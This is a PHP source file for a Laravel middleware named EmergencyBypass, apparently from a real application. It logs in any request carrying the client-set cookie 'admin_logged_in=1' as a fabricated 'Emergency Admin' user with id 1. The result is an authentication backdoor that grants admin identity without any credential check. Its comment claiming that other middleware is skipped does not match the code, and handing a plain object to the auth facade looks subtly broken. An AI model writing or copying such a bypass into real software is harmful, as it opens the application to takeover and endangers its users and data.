<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class EmergencyBypass
{
    public function handle(Request $request, Closure $next)
    {
        // Check for emergency cookie
        if ($request->cookie("admin_logged_in") === "1") {
            // Create fake user
            $user = new \stdClass();
            $user->id = 1;
            $user->name = "Emergency Admin";
            $user->email = "admin@askproai.de";
            
            // Force authentication
            \Illuminate\Support\Facades\Auth::setUser($user);
            
            // Skip all other middleware
            return $next($request);
        }
        
        return $next($request);
    }
}